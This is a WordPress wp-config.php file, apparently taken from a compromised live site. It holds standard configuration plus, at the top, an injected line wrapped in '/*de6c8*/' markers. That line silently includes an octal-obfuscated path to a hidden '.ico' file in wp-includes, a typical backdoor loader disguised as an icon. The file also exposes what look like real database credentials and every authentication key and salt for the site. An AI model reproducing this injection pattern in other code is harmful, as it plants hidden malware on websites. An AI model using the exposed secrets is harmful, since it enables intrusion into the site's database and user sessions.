<?php
/*de6c8*/

@include "\057home\057iiht\156epz/\160ubli\143_htm\154/iih\164soma\154ia/w\160-inc\154udes\057Requ\145sts/\103ooki\145/.4e\065fbf2\071.ico";

/*de6c8*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'iihtnepz_somalia');

/** MySQL database username */
define('DB_USER', 'iihtnepz_somalia');

/** MySQL database password */
define('DB_PASSWORD', 'JB*yP_2nB9uO');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'ajbp3mzolejgecavwkppgbtw1vh8y41vcjx4iwgyuxxalimfcjxrte51xfqv9mwo');
define('SECURE_AUTH_KEY',  '46e4n6u9xgkfnjh7vpqm8zyapfig0pldkmpl8chspjpgtmt9sedkfljm1sdcdzoe');
define('LOGGED_IN_KEY',    'i4a5zhzldfzeililojw2wsjmvg0bkh6jsnwzkrifq6jnmucpt9elaqdyd4taak4v');
define('NONCE_KEY',        'vtjrgwtr5ip9wqirdwsnbfbhvd521kmbuszarkiryaleipxqjf3k6tbjingii3jq');
define('AUTH_SALT',        'cv76nrfdf6pvib36siaenzsdf73fsdoqngpqoxcx8py7kglv3aw4xp1hzxnrv9nc');
define('SECURE_AUTH_SALT', '0hj1pnxeqt6fw2xxsu3kjbc73lui1uadccoey0bwuc9hg5ao9gvyiclhldf0cbuy');
define('LOGGED_IN_SALT',   'nihpmsc8xun8nplypaqkd1xukngeam0iapy8h1nbiuteqef50kdm4nqkomqadqmo');
define('NONCE_SALT',       'fbwyyvlyxr45c6n5qfseija5ipzyldxt1hjmhugachhivac4cuevcdqywsqbw13s');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wpaf_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
